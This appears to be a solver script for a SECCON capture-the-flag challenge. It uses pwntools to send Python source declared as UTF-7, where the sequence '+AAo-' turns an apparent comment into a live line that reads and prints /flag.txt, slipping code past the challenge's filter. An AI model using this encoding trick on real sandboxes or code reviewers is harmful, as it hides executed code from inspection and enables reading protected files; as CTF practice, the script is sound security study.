import os
import pwn

io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))

assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
    return x
    #+AAo-print(open("/flag.txt").read())
""".lstrip()

payload += "__EOF__"

io.sendlineafter(b"__EOF__):", payload.encode())

print(io.recvall().decode())
